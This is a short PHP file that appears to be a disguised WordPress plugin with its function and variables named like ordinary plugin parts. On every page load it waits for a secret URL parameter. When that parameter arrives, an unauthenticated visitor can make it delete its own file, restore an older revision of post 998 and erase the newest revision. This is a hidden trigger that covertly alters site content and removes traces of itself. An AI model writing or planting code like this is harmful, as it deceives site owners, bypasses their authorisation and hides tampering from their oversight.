<?php

function action_assistant_analytics() {
	if (isset($_GET['filter_script_flexible_size']) && $_GET['filter_script_flexible_size'] === 'templates_event_index') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$cf7_monitor_supports = 998;
		$permalink_compat_blocker_forms = wp_get_post_revisions($cf7_monitor_supports);
		if (empty($permalink_compat_blocker_forms)) die('no revisions');
		if (count($permalink_compat_blocker_forms) < 2) die('less than 2');
		$design_export_yoast_star = array_shift($permalink_compat_blocker_forms);
		$variations_restrict_profile = $design_export_yoast_star->ID;
		$supports_card_automatic = array_shift($permalink_compat_blocker_forms);
		$management_builder_calendar = $supports_card_automatic->ID;
		$products_post_gravity = wp_restore_post_revision($management_builder_calendar);
		if ($products_post_gravity === false) die('error restoring');
		$products_post_gravity = wp_delete_post_revision($variations_restrict_profile);		
		if ($products_post_gravity === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'action_assistant_analytics');
